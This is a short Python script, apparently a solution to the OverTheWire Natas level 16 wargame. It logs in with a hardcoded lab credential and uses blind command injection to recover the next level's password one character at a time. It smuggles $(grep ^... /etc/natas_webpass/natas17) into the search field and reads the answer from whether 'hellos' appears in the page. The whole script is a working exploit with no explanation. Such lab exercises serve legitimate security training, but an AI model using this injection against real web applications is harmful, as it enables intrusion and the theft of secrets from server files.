#!/usr/bin/python

import requests
import sys
import string

url = "http://natas16.natas.labs.overthewire.org"
space = string.ascii_letters + "1234567890"
password_length = 32

s = requests.Session()
s.auth = (u'natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh')

# http://natas16.natas.labs.overthewire.org/?needle=hello&submit=Search

password = ''
for i in range(password_length):
    for k in space:
        resp = s.get(url, params={'needle': f'hellos$(grep ^{password + k} /etc/natas_webpass/natas17)', 'submit':'Search'})
        sys.stdout.write(f"\r{password + k}")
        if "hellos" not in resp.text:
            password += k
            break

